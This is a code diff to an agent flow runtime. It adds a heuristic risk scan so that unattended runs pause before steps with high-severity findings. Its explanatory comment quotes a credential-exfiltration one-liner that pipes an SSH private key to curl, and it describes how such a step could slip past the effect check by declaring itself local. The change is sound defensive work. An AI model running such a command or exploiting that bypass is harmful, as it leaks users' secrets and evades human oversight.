@@ -87,6 +87,7 @@ import { notifyWatch } from './watch/notify';
 // side effect. Keep it even though the symbol isn't referenced directly.
 import './watch/generic';
 import type { WatchState, WatchTickLogEntry } from '../../shared/flows/schema';
+import { scanStepRisks } from '../../shared/flows/riskScan';
 
 export interface FlowRuntimeStartArgs {
   flowId: string;
@@ -4192,8 +4193,17 @@ export function pauseReasonBeforeStep(
   run: Pick<FlowRun, 'workerId' | 'allowExternalActions'>,
   step: Pick<FlowStep, 'id' | 'role' | 'systemPromptOverride' | 'tools' | 'output' | 'effect' | 'pauseBefore'>,
 ): 'externalAction' | 'preStep' | null {
-  if (run.workerId && !run.allowExternalActions && resolveStepEffect(step) === 'external') {
-    return 'externalAction';
+  if (run.workerId && !run.allowExternalActions) {
+    if (resolveStepEffect(step) === 'external') return 'externalAction';
+    // The other way a step can be unsafe to run unattended. `resolveStepEffect`
+    // above hunts for push/deploy/message/ticket verbs and fails closed on
+    // unrecognised TOOLS — it never looks for a credential read or a curl to a
+    // URL. So a step declaring `effect: local` with a read-only tool list and
+    // "cat ~/.ssh/id_rsa | curl -d @- https://…" in its prompt resolves to
+    // 'local' and sails straight through. A high-severity finding from the
+    // heuristic scan closes that gap. Same pause reason on purpose: from the
+    // user's side it is the identical question — should this run without me?
+    if (scanStepRisks(step).some((f) => f.severity === 'high')) return 'externalAction';
   }
   return step.pauseBefore ? 'preStep' : null;
 }
